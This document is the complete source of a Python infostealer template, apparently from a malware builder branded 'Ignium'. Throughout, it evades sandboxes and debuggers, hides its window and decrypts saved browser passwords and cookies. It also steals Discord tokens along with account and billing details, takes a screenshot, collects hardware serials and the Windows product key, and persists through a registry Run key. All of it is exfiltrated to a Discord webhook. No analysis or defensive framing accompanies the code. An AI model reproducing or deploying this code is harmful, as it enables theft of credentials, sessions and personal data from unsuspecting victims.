ignium_template = r'''import sys,os,json,requests,getpass,socket,platform,time,winreg,subprocess,shutil,re,sqlite3,base64,glob,psutil,ctypes,uuid
from datetime import datetime
try: from Crypto.Cipher import AES
except: from Cryptodome.Cipher import AES
try: import websocket
except: pass
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except: pass
try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except: pass
WEBHOOK = "%WEBHOOK%"
INJECTION_JS = %INJECTION_JS%
DO_INJECT = %DO_INJECT%
DO_STARTUP = %DO_STARTUP%
def show_error(msg): ctypes.windll.user32.MessageBoxW(0, msg, "System Error", 0x10)
def gS(path):
    try:
        from ctypes import windll, byref, c_int, c_void_p, Structure
        class GSI(Structure): _fields_ = [("V", c_int), ("D", c_void_p), ("S1", c_int), ("S2", c_int)]
        g = windll.gdiplus; t = c_void_p(); g.GdiplusStartup(byref(t), byref(GSI(1, 0, 0, 0)), 0)
        w, h = windll.user32.GetSystemMetrics(0), windll.user32.GetSystemMetrics(1)
        hDC = windll.user32.GetDC(0); mDC = windll.gdi32.CreateCompatibleDC(hDC)
        hB = windll.gdi32.CreateCompatibleBitmap(hDC, w, h); windll.gdi32.SelectObject(mDC, hB)
        windll.gdi32.BitBlt(mDC, 0, 0, w, h, hDC, 0, 0, 0x00CC0020)
        pB = c_void_p(); g.GdipCreateBitmapFromHBITMAP(hB, 0, byref(pB))
        cl = (ctypes.c_byte * 16)(*b'\x06\x2e\xd1\x55\x39\x0d\xd3\x11\x81\x73\x00\x00\xf8\x1e\xf3\x2e')
        g.GdipSaveImageToFile(pB, path, byref(cl), 0)
        g.GdipDisposeImage(pB); g.GdiplusShutdown(t)
        windll.gdi32.DeleteObject(hB); windll.gdi32.DeleteDC(mDC); windll.user32.ReleaseDC(0, hDC)
    except: pass
def is_analysis():
    bU = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
    bPC = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
    bH = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '11111111-2222-3333-4444-555555555555', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98']
    bIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170']
    bM = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca']
    bP = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
    if ctypes.windll.kernel32.IsDebuggerPresent(): return True
    for p in psutil.process_iter(['name']):
        if p.info['name'] and p.info['name'].lower() in bP: return True
    try:
        u, hN = getpass.getuser(), socket.gethostname()
        hw = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
        if u in bU or hN in bPC or hw in bH: return True
    except: pass
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text; ma = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        if ip in bIPS or ma in bM: return True
    except: pass
    t1 = time.time(); time.sleep(0.1)
    if time.time() - t1 < 0.1: return True
    return False
def CryptUnprotectData(data):
    from ctypes import windll, byref, Structure, c_ulong, POINTER, c_char, cast, string_at
    class DATA_BLOB(Structure): _fields_ = [("cbData", c_ulong), ("pbData", POINTER(c_char))]
    blob_in = DATA_BLOB(len(data), cast(ctypes.create_string_buffer(data), POINTER(c_char)))
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
        res = string_at(blob_out.pbData, blob_out.cbData)
        windll.kernel32.LocalFree(blob_out.pbData)
        return res
    return None
def gMK(path):
    if not os.path.exists(path): return None
    try:
        with open(path, "r", encoding="utf-8") as f: lS = json.load(f)
        mK = base64.b64decode(lS["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(mK)
    except: return None
def d_v(eb, k):
    try:
        if not eb: return ""
        if eb.startswith(b'v10') or eb.startswith(b'v11'):
            iv, enc = eb[3:15], eb[15:-16]
            return AES.new(k, AES.MODE_GCM, iv).decrypt(enc).decode(errors='ignore')
        else:
            res = CryptUnprotectData(eb)
            return res.decode(errors='ignore') if res else ""
    except: pass
    return ""
def gWPK():
    try:
        reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        v, _ = winreg.QueryValueEx(reg, "DigitalProductId")
        winreg.CloseKey(reg)
        b = list(v)[52:67]; ch = "BCDFGHJKMPQRTVWXY2346789"; r = ""
        for i in range(24, -1, -1):
            n = 0
            for j in range(14, -1, -1):
                n = n * 256 ^ b[j]; b[j] = n // 24; n %= 24
            r = ch[n] + r
            if i % 5 == 0 and i != 0: r = "-" + r
        return r
    except: return "N/A"
def gHW():
    h = {'CPU': 'N/A', 'GPU': 'N/A', 'RAM': 'N/A', 'Disk': 'N/A', 'BIOS': 'N/A', 'Base': 'N/A', 'WKey': 'N/A'}
    try:
        try: h['CPU'] = subprocess.check_output('wmic cpu get name', shell=True).decode().split('\n')[1].strip()
        except: pass
        try: h['GPU'] = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().split('\n')[1].strip()
        except: pass
        try: h['RAM'] = f"{round(psutil.virtual_memory().total / (1024**3))}GB"
        except: pass
        try: h['Disk'] = subprocess.check_output('wmic diskdrive get serialnumber', shell=True).decode().split('\n')[1].strip()
        except: pass
        try: h['BIOS'] = subprocess.check_output('wmic bios get serialnumber', shell=True).decode().split('\n')[1].strip()
        except: pass
        try: h['Base'] = subprocess.check_output('wmic baseboard get serialnumber', shell=True).decode().split('\n')[1].strip()
        except: pass
        try: h['WKey'] = gWPK()
        except: pass
    except: pass
    return h
def gSI():
    info = {}
    try:
        try:
            geo = requests.get('http://ip-api.com/json/', timeout=5).json()
            info['IP'] = geo.get('query', 'N/A'); info['City'] = geo.get('city', 'N/A'); info['Country'] = geo.get('country', 'N/A')
        except: pass
        info['Hostname'], info['User'] = socket.gethostname(), getpass.getuser()
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            eD, _ = winreg.QueryValueEx(k, "ProductName"); info['OS'] = eD
        except: info['OS'] = platform.system() + " " + platform.release()
    except: pass
    return info
def gDI(token):
    h = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        u = requests.get("https://discord.com/api/v9/users/@me", headers=h).json()
        if 'id' not in u: return None
        bad, fl = [], u.get("flags", 0)
        if fl & 1: bad.append("<:8485discordemployee:1496255712735526952>")
        if fl & 2: bad.append("<:6714discordpartner:1496255645228466377>")
        if fl & 8: bad.append("<:7732discordbughunterlv1:1496255670054551703>")
        if fl & 64: bad.append("<:1247discordbravery:1496255541519843439>")
        if fl & 128: bad.append("<:1350discordbrillance:1496255563518971934>")
        if fl & 512: bad.append("<:3121discordearlysupporter:1496255766355775688>")
        nit = "None"; p = u.get("premium_type", 0)
        if p >= 1: nit = "Nitro"; bad.append("<:67822opalnitrotier:1496255729278128318>")
        cD = datetime.utcfromtimestamp(((int(u['id']) >> 22) + 1420070400000) / 1000).strftime('%d/%m/%Y %H:%M:%S')
        bill = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=h).json()
        return {'username': u['username'], 'id': u['id'], 'email': u.get('email', 'N/A'), 'phone': u.get('phone', 'N/A'), 'badges': ' '.join(bad) if bad else 'None', 'nitro': nit, 'created': cD, 'billing': f"{len(bill)} sources"}
    except: return None
def k_b(ex): subprocess.run(f"taskkill /F /IM {ex}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def g_c(bp, dp, p=9222):
    try:
        ex = os.path.basename(bp); k_b(ex)
        cmd = [bp, f"--remote-debugging-port={p}", f"--user-data-dir={dp}", "--remote-allow-origins=*", "--headless", "--no-sandbox", "--disable-gpu", "--disable-extensions", "--restore-last-session"]
        pr = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        wu = None
        for _ in range(30):
            try:
                for h in ['127.0.0.1', 'localhost']:
                    try:
                        r = requests.get(f"http://{h}:{p}/json", timeout=2).json()
                        for pg in r:
                            if 'webSocketDebuggerUrl' in pg: wu = pg['webSocketDebuggerUrl']; break
                        if wu: break
                    except: pass
                if wu: break
            except: pass
            time.sleep(0.5)
        cks = []
        if wu:
            ws = websocket.create_connection(wu, timeout=10)
            ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"})); res = json.loads(ws.recv())
            raw = res.get('result', {}).get('cookies', [])
            for c in raw: cks.append(f"{c.get('domain','')}\t{'TRUE' if not c.get('hostOnly',False) else 'FALSE'}\t{c.get('path','')}\t{'TRUE' if c.get('secure',False) else 'FALSE'}\t{int(c.get('expires',0))}\t{c.get('name','')}\t{c.get('value','')}")
            ws.close()
        k_b(ex); return "\n".join(cks)
    except: return ""
class Chrom:
    def __init__(self, wH):
        self.wH = wH; self.aD, self.ro = os.getenv('LOCALAPPDATA'), os.getenv('APPDATA'); self.tmp = os.getenv('TEMP'); self.dir = os.path.join(self.tmp, os.urandom(10).hex())
        os.makedirs(self.dir, exist_ok=True)
        self.br = {
            'Chrome': (os.path.join(self.aD, 'Google/Chrome/User Data'), 'google-chrome'),
            'Edge': (os.path.join(self.aD, 'Microsoft/Edge/User Data'), 'msedge'),
            'Brave': (os.path.join(self.aD, 'BraveSoftware/Brave-Browser/User Data'), 'brave'),
            'Opera': (os.path.join(self.ro, 'Opera Software/Opera Stable'), 'opera'),
            'Opera GX': (os.path.join(self.ro, 'Opera Software/Opera GX Stable'), 'opera')
        }
        self.bps = {
            'google-chrome': os.path.join(os.getenv('ProgramFiles', 'C:\\Program Files'), 'Google/Chrome/Application/chrome.exe'),
            'msedge': os.path.join(os.getenv('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Microsoft/Edge/Application/msedge.exe'),
            'brave': os.path.join(os.getenv('ProgramFiles', 'C:\\Program Files'), 'BraveSoftware/Brave-Browser/Application/brave.exe'),
            'opera': os.path.join(self.ro, '../Local/Programs/Opera/launcher.exe'),
            'opera-gx': os.path.join(self.ro, '../Local/Programs/Opera GX/launcher.exe')
        }
        try: gS(os.path.join(self.dir, 'desktop_screenshot.png'))
        except: pass
        self.run()
    def run(self):
        for n, (dp, k) in self.br.items():
            if not os.path.exists(dp): continue
            bp = self.bps.get(k)
            if not bp or not os.path.exists(bp):
                for p in [os.getenv('ProgramFiles'), os.getenv('ProgramFiles(x86)'), 'C:\\Program Files', 'C:\\Program Files (x86)']:
                    if not p: continue
                    alt = os.path.join(p, bp.split('Application')[1].strip('\\/')) if bp and 'Application' in bp else bp
                    if alt and os.path.exists(alt): bp = alt; break
            os.makedirs(os.path.join(self.dir, n), exist_ok=True)
            if bp and os.path.exists(bp):
                cks = g_c(bp, dp)
                if cks:
                    with open(os.path.join(self.dir, n, 'cookies.txt'), 'w', encoding='utf-8') as f: f.write(cks)
            mK = gMK(os.path.join(dp, 'Local State'))
            if mK:
                for pr in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']:
                    pP = os.path.join(dp, pr)
                    if os.path.exists(pP): self.exP(n, pP, mK)
        self.snd()
    def exP(self, n, p, k):
        fP = os.path.join(p, 'Login Data')
        if not os.path.exists(fP): fP = os.path.join(p, 'Network', 'Login Data')
        if os.path.exists(fP):
            try:
                tP = os.path.join(self.tmp, os.urandom(10).hex()); shutil.copy2(fP, tP); c = sqlite3.connect(tP); cu = c.cursor()
                cu.execute("SELECT origin_url, username_value, password_value FROM logins")
                with open(os.path.join(self.dir, n, 'passwords.txt'), 'a', encoding='utf-8') as f:
                    for r in cu.fetchall():
                        d = d_v(r[2], k)
                        if d: f.write(f"{r[0]} | {r[1]} | {d}\n")
                c.close(); os.remove(tP)
            except: pass
    def snd(self):
        zP = os.path.join(self.tmp, 'ignium'); shutil.make_archive(zP, 'zip', self.dir); fZ = zP + '.zip'
        zS = os.path.getsize(fZ) / 1024
        pay = {
            "username": "Ignium | t.me/igniumlol",
            "avatar_url": "https://cdn3.emoji.gg/emojis/203899-shock.png",
            "embeds": [{
                "title": "📦 Ignium Vault",
                "color": 0x2B2D31,
                "fields": [
                    {"name": "File Info", "value": f"```ini\n[Name]: ignium.zip\n[Size]: {zS:.2f} KB\n```", "inline": True},
                    {"name": "Note", "value": "Password Decryption is Currently Broken", "inline": False}
                ],
                "footer": {"text": f"{socket.gethostname()} | t.me/igniumlol", "icon_url": "https://cdn3.emoji.gg/emojis/203899-shock.png"},
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        with open(fZ, 'rb') as f: requests.post(self.wH, data={'payload_json': json.dumps(pay)}, files={'file': (os.path.basename(fZ), f)})
        shutil.rmtree(self.dir); os.remove(fZ)
def gT():
    t, a, l = [], os.environ.get('APPDATA', ''), os.environ.get('LOCALAPPDATA', '')
    bP = {'Discord': os.path.join(a, 'discord'), 'Chrome': os.path.join(l, 'Google', 'Chrome', 'User Data'), 'Edge': os.path.join(l, 'Microsoft', 'Edge', 'User Data')}
    for n, p in bP.items():
        if not os.path.exists(p): continue
        mK = gMK(os.path.join(p, 'Local State'))
        for fP in glob.glob(os.path.join(p, "**", "*.ldb"), recursive=True) + glob.glob(os.path.join(p, "**", "*.log"), recursive=True):
            try:
                with open(fP, 'r', errors='ignore') as f:
                    c = f.read()
                    if mK:
                        for m in re.findall(r'dQw4w9WgXcQ:[^.*\" ]*', c):
                            try:
                                iv, pay = base64.b64decode(m.split('dQw4w9WgXcQ:')[1])[3:15], base64.b64decode(m.split('dQw4w9WgXcQ:')[1])[15:]; cipher = AES.new(mK, AES.MODE_GCM, iv)
                                d = cipher.decrypt(pay)[:-16].decode(); t.append(d)
                            except: pass
                    for m in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", c): t.append(m)
            except: pass
    return list(set(t))
def sU():
    if not DO_STARTUP: return
    try:
        p = os.path.join(os.getenv('APPDATA'), 'Ignium.exe')
        if not os.path.exists(p):
            shutil.copy2(sys.executable, p)
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "Ignium", 0, winreg.REG_SZ, f'"{p}"')
            winreg.CloseKey(k)
    except: pass
def sR():
    sU()
    if is_analysis(): return
    try: Chrom(WEBHOOK)
    except: pass
    time.sleep(1); inf, t, tF, hW = gSI(), gT(), [], gHW()
    for tk in t:
        ac = gDI(tk)
        if ac:
            tF.append({"name": f"👤  Account: {ac['username']}", "value": f"**🆔  ID**: `{ac['id']}`\n**🗓️  Created**: `{ac['created']}`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", "inline": False})
            tF.append({"name": "💎  Subscription & Badges", "value": f"**Nitro**: `{ac['nitro']}`\n**Badges**: {ac['badges']}\n**Billing**: `{ac['billing']}`", "inline": True})
            tF.append({"name": "📧  Contact Info", "value": f"**Email**: `{ac['email']}`\n**Phone**: `{ac['phone']}`", "inline": True})
            tF.append({"name": "🎫  Token", "value": f"```{tk}```", "inline": False})
    emb = {"title": f"💉  Infected - {inf.get('Hostname')}/{inf.get('User')}", "color": 0x2B2D31, "fields": [
        {"name": "🌍  Geolocation", "value": f"```ini\n[IP]: {inf.get('IP')}\n[City]: {inf.get('City')}\n[Country]: {inf.get('Country')}\n```", "inline": False},
        {"name": "💻  Hardware Information", "value": f"```ini\n[CPU Serial]: {hW.get('CPU')}\n[GPU Serial]: {hW.get('GPU')}\n[RAM Serial]: {hW.get('RAM')}\n[Disk Serial]: {hW.get('Disk')}\n[BIOS Serial]: {hW.get('BIOS')}\n[Base Serial]: {hW.get('Base')}\n[Windows Key]: {hW.get('WKey')}\n```", "inline": False}
    ], "footer": {"text": f"{inf.get('Hostname')} | t.me/igniumlol", "icon_url": "https://cdn3.emoji.gg/emojis/203899-shock.png"}, "timestamp": datetime.utcnow().isoformat()}
    emb['fields'].extend(tF[:20]); pay = {'username': 'Ignium | t.me/igniumlol', 'avatar_url': 'https://cdn3.emoji.gg/emojis/203899-shock.png', 'embeds': [emb]}
    try: requests.post(WEBHOOK, json=pay, timeout=30)
    except: pass
'''
